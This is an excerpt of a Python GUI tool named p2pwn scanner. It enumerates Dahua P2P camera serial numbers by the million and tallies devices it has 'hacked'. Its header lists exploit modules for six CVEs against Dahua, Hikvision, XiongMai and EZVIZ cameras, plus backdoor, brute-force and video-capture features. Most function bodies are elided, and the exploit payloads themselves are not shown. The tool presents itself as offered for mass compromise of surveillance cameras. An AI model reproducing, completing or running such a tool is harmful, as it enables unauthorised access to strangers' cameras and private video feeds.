#!/usr/bin/env python3
# p2pwn_scanner.py - Dahua P2P Scanner GUI v2.0 FINAL
# 6 CVEs + OSD + Video + Backdoor + Brute + SQLite + Export
# Requires: pip install requests
# Run: python3 p2pwn_scanner.py
...
# ============================================================
# CVE MODULE - FULL 6 CVEs
# ============================================================
class CVEModule:
    """
    Supported:
      CVE-2018-10088 - XiongMai uc-httpd Buffer Overflow
      CVE-2021-33044 - Dahua NetKeyboard Auth Bypass
      CVE-2021-33045 - Dahua Loopback Auth Bypass
      CVE-2021-36260 - Hikvision Command Injection
      CVE-2022-30563 - Dahua ONVIF Replay
      CVE-2023-48121 - EZVIZ Command Port Bypass
    """
...
class P2PwnScanner:
    def __init__(self, root):
        self.root = root
        self.root.title("p2pwn Scanner v2.0")
    ...
    def poll_log(self):
        try:
            ...
            pass
        self.root.after(120, self.poll_log)
    ...
    def scan_worker(self, prefix):
        ...
        if len(prefix) == 10:
            ...
            for combo in product(charset, repeat=6):
                serials.append(prefix + "".join(combo))
                if len(serials) >= 1_000_000:
                    break
        else:
            serials = [prefix]

        self.stats["total"] = len(serials)
        self.update_stats()
        self.log(log_msg(
            f"Bắt đầu {len(serials)} serial, threads={threads}"))

        q = queue.Queue()
        for s in serials:
            q.put(s)

        # Snapshot config on main thread
        cfg = {
            "osd_pro": self.v_osd_pro.get(),
            "video": self.v_video.get(),
            "osd": self.v_osd.get(),
        ...
        def worker():
            ...
            while not self.stop_event.is_set():
                ...
                try:
                    ...
                    self.root.after(
                        0, lambda s=serial, i=display_ip:
                        self.append_tab(self.txt_online, f"{s} -> {i}"))
                    ...
                    if hacked:
                        ...
                        self.update_stats()
                        self.root.after(
                            0, lambda s=serial, i=ip:
                            self.append_tab(self.txt_hack, f"{s} -> {i}"))
                    else:
                        self.stats["skip"] += 1
                        self.update_stats()
